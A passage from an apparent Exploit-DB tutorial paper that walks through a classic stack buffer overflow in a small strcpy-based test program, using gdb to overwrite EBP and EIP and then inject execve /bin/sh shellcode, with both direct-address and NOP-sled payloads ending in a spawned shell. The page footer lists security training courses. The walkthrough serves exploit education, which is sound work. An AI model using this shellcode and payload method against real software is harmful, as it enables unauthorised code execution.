+mov %ebp, %esp &lt;- restores EBP(old frame from main function).
+pop %ebp       &lt;- take off EBP from ESP(old frame) and loads at %ebp (EBP saved at bof). 
+ 
+At line bof+36, RET instruction gets what %esp is pointing to and loads, at EIP
+register, this pointed address, so, this address will be executed when returns
+to main fucntion and will follow the normal flow even main finishs.
+ 
+Process Layout at this moment looks like:
+ 
+0xbfffffff                       
+     +----&gt; |--------------------| --------------------------------+
+     |      | char *string       |  bof()                          |
+     |      |                    |                                 |
+     |      |--------------------|                                 |
+     |      | saved EIP          | - from caller(main) of bof()    |
+     |      |--------------------|                                 |
+     |      | saved EBP          | - from caller(main) of bof()    |
+     |      |--------------------|                                 |
+     |      | 0x118b @ buffer[]  |   NEW STACK FRAME               |
+     |      |--------------------| --------------------------------+
+     |      | strcpy()           |
+     |      |--------------------|
+     |      | return 1;          |
+     |      |--------------------|
+     |      | mov %ebp,%esp      | ---+
+     |      |--------------------|    | - leave instruction
+     |      | pop %ebp           | ---+
+     |      |--------------------|  
+     |      | ret gets (%esp)    | ---+
+     |      |--------------------|    | - ret instruction
+     |      | loads (%esp) @ EIP | ---+
+     |      |--------------------|
+     |      |                    |
+     |      |--------------------|
+     |      | .text              |
+     |      |--------------------|
+     +----  | call bof() @ main  |
+0x08040000  |--------------------|
+            |                    |
+            |--------------------|
+            | shared libraries   |
+0x08000000  |--------------------|
+ 
+Let&#039;s check execution of the program at gdb.
+ 
+[xgc@trapdown:~]$ gdb ./simple_stack -q
+Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483e9 &lt;main+0&gt;:    push   %ebp
+0x080483ea &lt;main+1&gt;:    mov    %esp,%ebp
+0x080483ec &lt;main+3&gt;:    sub    $0x8,%esp
+0x080483ef &lt;main+6&gt;:    and    $0xfffffff0,%esp
+0x080483f2 &lt;main+9&gt;:    mov    $0x0,%eax
+0x080483f7 &lt;main+14&gt;:   sub    %eax,%esp
+0x080483f9 &lt;main+16&gt;:   mov    0xc(%ebp),%eax
+0x080483fc &lt;main+19&gt;:   add    $0x4,%eax
+0x080483ff &lt;main+22&gt;:   mov    (%eax),%eax
+0x08048401 &lt;main+24&gt;:   mov    %eax,(%esp)
+0x08048404 &lt;main+27&gt;:   call   0x80483c4 &lt;bof&gt;
+0x08048409 &lt;main+32&gt;:   movl   $0x8048534,(%esp)
+0x08048410 &lt;main+39&gt;:   call   0x80482d8 &lt;_init+56&gt;
+0x08048415 &lt;main+44&gt;:   mov    $0x1,%eax
+0x0804841a &lt;main+49&gt;:   leave
+0x0804841b &lt;main+50&gt;:   ret
+0x0804841c &lt;main+51&gt;:   nop
+0x0804841d &lt;main+52&gt;:   nop
+0x0804841e &lt;main+53&gt;:   nop
+0x0804841f &lt;main+54&gt;:   nop
+End of assembler dump.
+(gdb) break *main+24
+Breakpoint 1 at 0x8048401
+(gdb) run testing...
+Starting program: /home/xgc/simple_stack testing...
+ 
+Breakpoint 1, 0x08048401 in main ()
+(gdb) x/x $esp+0x04
+0xbffffb24:     0xbffffb84
+(gdb) x/x 0xbffffb84
+0xbffffb84:     0xbffffc60
+(gdb) x/s 0xbffffc60
+0xbffffc60:      &quot;/home/xgc/simple_stack&quot;
+(gdb)
+0xbffffc77:      &quot;testing...&quot;
+(gdb)
+ 
+As I said about the process to load argv[1] into the stack.
+At $esp+0x4 stands argv[0].
+ 
+(gdb) d 1
+(gdb) break *main+27
+Breakpoint 2 at 0x8048404
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 &lt;bof+0&gt;:     push   %ebp
+0x080483c5 &lt;bof+1&gt;:     mov    %esp,%ebp
+0x080483c7 &lt;bof+3&gt;:     sub    $0x118,%esp
+0x080483cd &lt;bof+9&gt;:     mov    0x8(%ebp),%eax
+0x080483d0 &lt;bof+12&gt;:    mov    %eax,0x4(%esp)
+0x080483d4 &lt;bof+16&gt;:    lea    0xfffffef8(%ebp),%eax
+0x080483da &lt;bof+22&gt;:    mov    %eax,(%esp)
+0x080483dd &lt;bof+25&gt;:    call   0x80482e8 &lt;_init+72&gt;
+0x080483e2 &lt;bof+30&gt;:    mov    $0x1,%eax
+0x080483e7 &lt;bof+35&gt;:    leave
+0x080483e8 &lt;bof+36&gt;:    ret
+End of assembler dump.
+(gdb)
+ 
+At bof function we can see a problem with strcpy function.
+The function strcpy() does not check its boundaries, that means
+that it does not check if argv[1] fits into buffer, and just keeps
+on copying into buffer until it encounters a NULL string (\0).
+ 
+ 
+---------[ 0x1a0 - Getting Start: Overflowing/Controlling/Executing ]
+ 
+Let&#039;s fill the buffer more than it supports.
+ 
+(gdb) run `perl -e &#039;print &quot;A&quot;x264,&quot;BBBB&quot;&#039;`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot;x264,&quot;BBBB&quot;&#039;`
+ 
+Breakpoint 2, 0x08048404 in main ()
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x08048400 in main ()
+(gdb) i r ebp
+ebp            0x42424242       0x42424242
+(gdb)
+ 
+Now let&#039;s see what happen before segmentation fault:
+ 
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 &lt;bof+0&gt;:     push   %ebp
+0x080483c5 &lt;bof+1&gt;:     mov    %esp,%ebp
+0x080483c7 &lt;bof+3&gt;:     sub    $0x118,%esp
+0x080483cd &lt;bof+9&gt;:     mov    0x8(%ebp),%eax
+0x080483d0 &lt;bof+12&gt;:    mov    %eax,0x4(%esp)
+0x080483d4 &lt;bof+16&gt;:    lea    0xfffffef8(%ebp),%eax
+0x080483da &lt;bof+22&gt;:    mov    %eax,(%esp)
+0x080483dd &lt;bof+25&gt;:    call   0x80482e8 &lt;_init+72&gt;
+0x080483e2 &lt;bof+30&gt;:    mov    $0x1,%eax
+0x080483e7 &lt;bof+35&gt;:    leave
+0x080483e8 &lt;bof+36&gt;:    ret
+End of assembler dump.
+(gdb) break *bof+35
+Breakpoint 1 at 0x80483e7
+(gdb) display/1i $eip
+(gdb) run `perl -e &#039;print &quot;A&quot; x 264, &quot;BBBB&quot;&#039;`
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot; x 264, &quot;BBBB&quot;&#039;`
+ 
+Breakpoint 1, 0x080483e7 in bof ()
+1: x/i $eip  0x80483e7 &lt;bof+35&gt;:        leave
+(gdb) i r ebp
+ebp            0xbffffa18       0xbffffa18
+(gdb) stepi
+0x080483e8 in bof ()
+1: x/i $eip  0x80483e8 &lt;bof+36&gt;:        ret
+(gdb) i r ebp
+ebp            0x42424242       0x42424242
+(gdb)
+ 
+EBP was overwritten. Segmentation fault have been ocurred at RET, of bof
+function, that got what %esp is pointing(leave instruction) to and puts at 
+eip register this pointed address. Check out process layout after EBP controlled:
+ 
+0xbfffffff                       
+     +----&gt; |-----------------------| --------------------------------+
+     |      | char *string          |  bof()                          |
+     |      |                       |                                 |
+     |      |-----------------------|                                 |
+     |      | saved EIP             | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | saved EBP(0x42424242) | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | 0x118b @ buffer[]     |   NEW STACK FRAME               |
+     |      |-----------------------| --------------------------------+
+     |      | strcpy()              |
+     |      |-----------------------|
+     |      | return 1;             |
+     |      |-----------------------|
+     |      | mov %ebp, %esp        | ---+
+     |      |-----------------------|    | - leave instruction
+     |      | pop %ebp              | ---+
+     |      |-----------------------|  
+     |      | ret gets (%esp)       | ---+
+     |      |-----------------------|    | - ret instruction
+     |      | loads (%esp) @ EIP    | ---+
+     |      |-----------------------|
+     |      |                       |
+     |      |-----------------------|
+     |      | .text                 |
+     |      |-----------------------|
+     +----  | call bof() @ main     |
+0x08040000  |-----------------------|
+            |                       |
+            |-----------------------|
+            | shared libraries      |
+0x08000000  |-----------------------|
+ 
+Let&#039;s add more four bytes and run the program again.
+ 
+(gdb) run `perl -e &#039;print &quot;A&quot;x264,&quot;BBBB&quot;,&quot;CCCC&quot;&#039;`
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot;x264,&quot;BBBB&quot;,&quot;CCCC&quot;&#039;`
+ 
+Breakpoint 2, 0x08048404 in main ()
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+(gdb) i r ebp eip
+ebp            0x42424242       0x42424242
+eip            0x43434343       0x43434343
+(gdb) 
+ 
+Now let&#039;s see what happen before segmentation fault:
+ 
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483e9 &lt;main+0&gt;:    push   %ebp
+0x080483ea &lt;main+1&gt;:    mov    %esp,%ebp
+0x080483ec &lt;main+3&gt;:    sub    $0x8,%esp
+0x080483ef &lt;main+6&gt;:    and    $0xfffffff0,%esp
+0x080483f2 &lt;main+9&gt;:    mov    $0x0,%eax
+0x080483f7 &lt;main+14&gt;:   sub    %eax,%esp
+0x080483f9 &lt;main+16&gt;:   mov    0xc(%ebp),%eax
+0x080483fc &lt;main+19&gt;:   add    $0x4,%eax
+0x080483ff &lt;main+22&gt;:   mov    (%eax),%eax
+0x08048401 &lt;main+24&gt;:   mov    %eax,(%esp)
+0x08048404 &lt;main+27&gt;:   call   0x80483c4 &lt;bof&gt;
+0x08048409 &lt;main+32&gt;:   movl   $0x8048534,(%esp)
+0x08048410 &lt;main+39&gt;:   call   0x80482d8 &lt;_init+56&gt;
+0x08048415 &lt;main+44&gt;:   mov    $0x1,%eax
+0x0804841a &lt;main+49&gt;:   leave
+0x0804841b &lt;main+50&gt;:   ret
+0x0804841c &lt;main+51&gt;:   nop
+0x0804841d &lt;main+52&gt;:   nop
+0x0804841e &lt;main+53&gt;:   nop
+0x0804841f &lt;main+54&gt;:   nop
+End of assembler dump.
+(gdb) break *main+44
+Breakpoint 1 at 0x8048415
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 &lt;bof+0&gt;:     push   %ebp
+0x080483c5 &lt;bof+1&gt;:     mov    %esp,%ebp
+0x080483c7 &lt;bof+3&gt;:     sub    $0x118,%esp
+0x080483cd &lt;bof+9&gt;:     mov    0x8(%ebp),%eax
+0x080483d0 &lt;bof+12&gt;:    mov    %eax,0x4(%esp)
+0x080483d4 &lt;bof+16&gt;:    lea    0xfffffef8(%ebp),%eax
+0x080483da &lt;bof+22&gt;:    mov    %eax,(%esp)
+0x080483dd &lt;bof+25&gt;:    call   0x80482e8 &lt;_init+72&gt;
+0x080483e2 &lt;bof+30&gt;:    mov    $0x1,%eax
+0x080483e7 &lt;bof+35&gt;:    leave
+0x080483e8 &lt;bof+36&gt;:    ret
+End of assembler dump.
+(gdb) break *bof+35
+Breakpoint 2 at 0x80483e7
+(gdb) display/1i $eip
+(gdb) run `perl -e &#039;print &quot;A&quot; x 264, &quot;BBBB&quot;,&quot;CCCC&quot;&#039;`
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot; x 264, &quot;BBBB&quot;,&quot;CCCC&quot;&#039;`
+ 
+Breakpoint 2, 0x080483e7 in bof ()
+1: x/i $eip  0x80483e7 &lt;bof+35&gt;:        leave
+(gdb) i r ebp eip
+ebp            0xbffffa18       0xbffffa18
+eip            0x80483e7        0x80483e7
+(gdb) stepi
+0x080483e8 in bof ()
+1: x/i $eip  0x80483e8 &lt;bof+36&gt;:        ret
+(gdb) i r ebp eip
+ebp            0x42424242       0x42424242
+eip            0x80483e8        0x80483e8
+(gdb) stepi
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb) i r ebp eip
+ebp            0x42424242       0x42424242
+eip            0x43434343       0x43434343
+(gdb)
+ 
+EBP and EIP were overwritten. Segmentation fault have been ocurred at RET, of bof
+function, that got what %esp is pointing to and puts at eip register this pointed
+address, when it Returns to main function Check out process layout after EIP
+and EBP controlled:
+ 
+0xbfffffff                       
+     +----&gt; |-----------------------| --------------------------------+
+     |      | char *string          |  bof()                          |
+     |      |                       |                                 |
+     |      |-----------------------|                                 |
+     |      | saved EIP(0x43434343) | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | saved EBP(0x42424242) | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | 0x118b @ buffer[]     |   NEW STACK FRAME               |
+     |      |-----------------------| --------------------------------+
+     |      | strcpy()              |
+     |      |-----------------------|
+     |      | return 1;             |
+     |      |-----------------------|
+     |      | mov %ebp,%esp         | ---+
+     |      |-----------------------|    | - leave instruction
+     |      | pop %ebp              | ---+
+     |      |-----------------------|  
+     |      | ret gets (%esp)       | ---+
+     |      |-----------------------|    | - ret instruction
+     |      | loads (%esp) @ EIP    | ---+
+     |      |-----------------------|
+     |      |                       |
+     |      |-----------------------|
+     |      | .text                 |
+     |      |-----------------------|
+     +----  | call bof() @ main     |
+0x08040000  |-----------------------|
+            |                       |
+            |-----------------------|
+            | shared libraries      |
+0x08000000  |-----------------------|
+ 
+EIP controlled means that we can now jump to anywhere or execute any instruction
+or any code. Our goal here is inject shellcode at stack memory and makes EIP jumps 
+to there to execute /bin/sh. Let&#039;s restart the process at GDB.
+ 
+[xgc@trapdown:~]$ gdb ./simple_stack -q
+Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
+(gdb) break *main+27
+Breakpoint 1 at 0x8048404
+(gdb) display/1i $eip
+(gdb) run `perl -e &#039;print &quot;A&quot;x264,&quot;BBBB&quot;,&quot;CCCC&quot;&#039;`
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot;x264,&quot;BBBB&quot;,&quot;CCCC&quot;&#039;`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 &lt;main+27&gt;:       call   0x80483c4 &lt;bof&gt;
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb)
+ 
+First, we&#039;ve break at call of bof function just to debug.
+I&#039;ve also set one display to watch EIP as ASM Instruction format and
+after we continue to leave the break. Getting informations about main registers
+we can see that EBP and EIP were controlled by us. Our code to execute will be 
+called by shellcode. But try to figure out, to overwrite EIP we filled the buffer
+with 272 bytes. So our malicious buffer will looks like:
+ 
+[################] + [SHELLCODE] + [CCCC] = 272 bytes.
+ 
+[################] = Garbage
+[SHELLCODE]        = Code to execute /bin/sh
+[CCCC]             = Bytes to overwrite EIP
+------------------ = 272 bytes.
+ 
+We&#039;ll use this follow shellcode:
+ 
+&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3&quot;
+&quot;\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;
+ 
+This shellcode have 24 bytes and executes /bin/sh.
+ 
+[################] = Garbage                  - 244 bytes
+[SHELLCODE]        = Code to execute /bin/sh  -  24 bytes
+[CCCC]             = Bytes to overwrite EIP   -   4 bytes
+------------------ = 272 bytes.
+ 
+Now we&#039;ll back to GDB and build our malicious buffer.
+ 
+(gdb) run `perl -e &#039;print &quot;A&quot;x244,&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;CCCC&quot; &#039;`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot;x244,&quot;\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;CCCC&quot;&#039;`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 &lt;main+27&gt;:       call   0x80483c4 &lt;bof&gt;
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb) i r eip
+eip            0x43434343       0x43434343
+(gdb)
+ 
+As we can see, theory works and EIP still controlled by us.
+Well, the 4 bytes to control EIP must be replaced by the address of shellcode at ESP.
+After replaced &quot;CCCC&quot; by the address of shellcode (as we said before, will points 
+to the next instruction), shellcode will be executed. All processs looks like:
+ 
+                           +-------------+ 
+                           |             |
+                           v             |
+[################] + [SHELLCODE] + [&amp;SHELLCODE] = 272 bytes.
+                                      (EIP)
+ 
+To get address of this shellcode at stack memory we can do a direct jump
+to begin of shellcode instructions or use NOP bytes.
+ 
+For direct jump method we need to check where shellcode instructions starts at stack
+memory. Let&#039;s see:
+ 
+(gdb) x/128xb $esp
+          .
+          .
+          .
+0xbffffc48:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffc50:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffc58:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffc60:     0x41    0x41    0x41    0x41    0x31    0xc0    0x50    0x68
+0xbffffc68:     0x2f    0x2f    0x73    0x68    0x68    0x2f    0x62    0x69
+0xbffffc70:     0x6e    0x89    0xe3    0x50    0x53    0x89    0xe1    0x99
+0xbffffc78:     0xb0    0x0b    0xcd    0x80    0x43    0x43    0x43    0x43
+ 
+We can see part of our A&#039;s and following the shellcode and to finishs &quot;CCCC&quot;.
+So, shellcode address is at 0xbffffc64.
+Now we need to add this address inside of our malicious buffer, in little endian 
+format, and re-execute the program.
+ 
+Backing to GDB again.
+ 
+(gdb) run `perl -e &#039;print &quot;A&quot;x244,&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;\x64\xfc\xff\xbf&quot; &#039;`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot;x244,&quot;\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;\x64\xfc\xff\xbf&quot;&#039;`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 &lt;main+27&gt;:       call   0x80483c4 &lt;bof&gt;
+(gdb) c
+Continuing.
+ 
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000c20 in ?? () from /lib/ld-linux.so.2
+1: x/i $eip  0x40000c20 &lt;completed.1+939226576&gt;:        mov    %esp,%eax
+(gdb) c
+Continuing.
+sh-2.05b$
+ 
+Our shellcode was sucessfuly executed.
+ 
+Now the stack layout after success execution:
+ 
+                 32 bits
+0xbfffffff ------------------------- -------------------------+
+           |                        |  bof()                  |
+           | char *string           |                         |
+           |                        |                         |
+           |------------------------|      NEW STACK FRAME    |
+           | SAVED EIP (0xbffffc64) |&lt;--+                     |
+           |------------------------|   |                     |
+           | SAVED EBP (0x80cd0bb0) |   |                     |
+           |------------------------| --|---------------------|
+           | SHELLCODE              |&lt;--+   Malicous buffer   |
+           |------------------------|   |     (272bytes)      |
+           | A x 244                |   |                     |
+           |------------------------|---+---------------------+
+           |                        |
+           |------------------------|
+           | .text                  |
+           |------------------------|
+           | call bof() @ main      |
+0x08040000 |------------------------|
+           |                        |
+           |------------------------|
+           | shared libraries       |
+0x08000000 |------------------------|
+ 
+The NOP idea is simple. A NOP is an instruction that does nothing. 
+It only takes up space. (Incidentally, the NOP was originally created 
+for debugging.) Since the NOP is only a single byte long, it is immune 
+to the problems of byte ordering and alignment issues.
+The trick involves filling our buffer with NOPs before the actual payload. If
+we incorrectly guess the address of the payload, it will not matter, as long as we
+guess an address that points somewhere in a NOP sled. Since the entire buffer is
+full of NOPs, we can guess any address that lands in the buffer. Once we land
+on a NOP, we will begin executing each NOP. We slide forward over all the
+NOPs until we reach our actual payload. The larger the buffer of NOPs, the less
+precise we need to be when guessing the address of our payload. Let&#039;s see:
+ 
+(gdb) run `perl -e &#039;print &quot;\x90&quot;x244,&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;CCCC&quot;&#039;`
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;\x90&quot;x244,&quot;\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;CCCC&quot;&#039;`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 &lt;main+27&gt;:       call   0x80483c4 &lt;bof&gt;
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb) x/128xb $esp
+          .
+          .
+          .
+0xbffffc30:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc38:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc40:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc48:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc50:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc58:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc60:     0x90    0x90    0x90    0x90    0x31    0xc0    0x50    0x68
+0xbffffc68:     0x2f    0x2f    0x73    0x68    0x68    0x2f    0x62    0x69
+0xbffffc70:     0x6e    0x89    0xe3    0x50    0x53    0x89    0xe1    0x99
+0xbffffc78:     0xb0    0x0b    0xcd    0x80    0x43    0x43    0x43    0x43
+ 
+Shellcode address can be now any address of NOP. Let&#039;s choice 0xbffffc38,
+insert at our cdm line in GDB, in little endian format, and re-execute GDB.
+  
+(gdb) run `perl -e &#039;print &quot;A&quot;x244,&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;\x38\xfc\xff\xbf&quot;&#039;`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e &#039;print &quot;A&quot;x244,&quot;\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;,&quot;\x38\xfc\xff\xbf&quot;&#039;`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 &lt;main+27&gt;:       call   0x80483c4 &lt;bof&gt;
+(gdb) c
+Continuing.
+ 
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000c20 in ?? () from /lib/ld-linux.so.2
+1: x/i $eip  0x40000c20 &lt;completed.1+939226576&gt;:        mov    %esp,%eax
+(gdb) c
+Continuing.
+sh-2.05b$
+  
+Our shellcode was sucessfuly executed.
+ 
+ 
+---------[ 0x1b0 - Conclusion ]
+ 
+I&#039;ve described the most known and basic stack overflow module. Different methods
+can be used if the buffer isn&#039;t big enough for the shellcode or if some Stack
+protections are installed. Coming soon theses methods will be described also.
+ 
+|=-----------------------------------------------------------------------------=|
+
+
+# milw0rm.com [2006-03-09]
+            </code></pre>
+
+                    </div>
+
+                    <div class="card-footer">
+
+                        <div class="row">
+
+                            <div class="col">
+
+                                <strong>Tags:</strong>
+
+                                
+                            </div>
+
+                            <div class="col">
+
+                                
+                                
+                            </div>
+
+                            <div class="col">
+
+                                <span class="float-right">
+
+                                    <strong>Advisory/Source:</strong>
+
+                                    <a href="" target="_blank">
+                                        Link
+                                    </a>
+
+                                </span>
+
+                            </div>
+
+                        </div>
+
+                        <div class="row mt-3">
+
+                            <div class="btn-group ml-2">
+
+                                <a class="btn btn-primary btn-fab btn-icon btn-round"
+                                   href="/papers/13237" aria-label="View Previous Paper"
+                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
+                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
+                                </a>
+
+                            </div>
+
+                            <div class="col">
+
+                                <div class="btn-group float-right">
+
+                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
+                                       href="/papers/13239" aria-label="View Next Paper"
+                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
+                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
+                                    </a>
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <div class="card">
+
+                    <div class="card-footer">
+
+    <div class="d-none d-lg-block">
+
+        <div class="container-fluid">
+
+            <table class="table table-borderless text-center">
+
+                <thead style="background-color:#083257;">
+
+                <tr class="text-white">
+                        <th>
+                            <strong>Downloads</strong>
+                        </th>
+                        <th>
+                            <strong>Certifications</strong>
+                        </th>
+                        <th>
+                            <strong>Training</strong>
+                        </th>
+                        <th>
+                            <strong>Professional Services</strong>
+                        </th>
+                    </tr>
+
+                </thead>
+
+                <tbody>
+
+                <tr class="text-center">
+                    <td>
+                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
+                            Kali Linux
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/pentest-training-with-kali-linux"
+                           target="_blank" rel="noopener">OSCP
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/pentest-training-with-kali-linux"
+                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
+                           <br />All new for 2020
+                        </a>
+                    </td>
+                    <td>
+                        <a href="https://www.offensive-security.com/penetration-testing/"
+                           target="_blank" rel="noopener">Penetration Testing
+                        </a>
+                    </td>
+                </tr>
+
+                <tr class="text-center">
+                    <td>
+                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
+                           target="_blank" rel="noopener">
+                            Kali NetHunter
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/wireless-attacks-training"
+                           target="_blank" rel="noopener">OSWP
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/wireless-attacks-training"
+                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
+                        </a>
+                    </td>
+                    <td>
+                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
+                           target="_blank" rel="noopener">Advanced Attack Simulation
+                        </a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
+                           target="_blank" rel="noopener">Kali Linux Revealed Book
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/evasion-techniques-breaching-defenses"
+                           target="_blank" rel="noopener">OSEP
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/evasion-techniques-breaching-defenses"
+                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
+                           <br />All new for 2020
+                        </a>
+                    </td>
+                    <td>
+                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
+                           target="_blank" rel="noopener">Application Security Assessment
+                        </a>
+                    </td>
+                </tr>
+
+                <tr class="text-center">
+                    <td></td>
+                    <td>
+                        <a href="/advanced-web-attacks"
+                           target="_blank" rel="noopener">OSWE
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/advanced-web-attacks"
+                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
+                           <br />Updated for 2020
+                        </a>
+                    </td>
+                    <td></td>
+                </tr>
+
+                <tr class="text-center">
+                    <td></td>
+                    <td>
+                        <a href="/windows-user-mode-exploit-development"
+                           target="_blank" rel="noopener">OSED
+                        </a>
+                    </td>
+                    <td>
+                        <a href="/windows-user-mode-exploit-development"
+                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
+                           <br />All new for 2021
+                        </a>
+                    </td>
+                    <td></td>
+                </tr>
+
+                <tr class="text-center">
+                    <td></td>
+                    <td>
+                        <a href="https://www.offensive-security.com/awe-osee/"
+                           target="_blank" rel="noopener">OSEE
+                        </a>
+                    </td>
+                    <td>
+<!--
+                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
+                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
+                        </a>
+-->
+                    </td>
+                    <td></td>
+                </tr>
+
+                <tr class="text-center">
+                    <td></td>
+                    <td>
+                        <a href="https://kali.training/"
+                           target="_blank" rel="noopener">KLCP
+                        </a>
+                    </td>
+                    <td>
+                        <a href="https://kali.training/courses/kali-linux-revealed/"
+                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
+                        </a>
+                    </td>
+                    <td></td>
+                </tr>
+
+                </tbody>
+
+            </table>
+
+        </div>
+
+    </div>
+
+    <div class="d-lg-none text-center">
+
+        <div class="btn-group btn-block mt-1">
+
+            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Downloads
+            </a>
+
+            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">
+
+                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
+                    Kali Linux
+                </a>
+                <a class="dropdown-item"
+                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
+                   target="_blank" rel="noopener">
+                    Kali NetHunter
+                </a>
+                <a class="dropdown-item"
+                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
+                   target="_blank" rel="noopener">
+                    Kali Linux Revealed Book
+                </a>
+
+            </div>
+
+        </div>
+
+        <div class="btn-group btn-block mt-1">
+
+            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Certifications
+            </a>
+
+            <div class="dropdown-menu" aria-labelledby="dropdownCerts">
+
+                <a class="dropdown-item"
+                   href="/pentest-training-with-kali-linux"
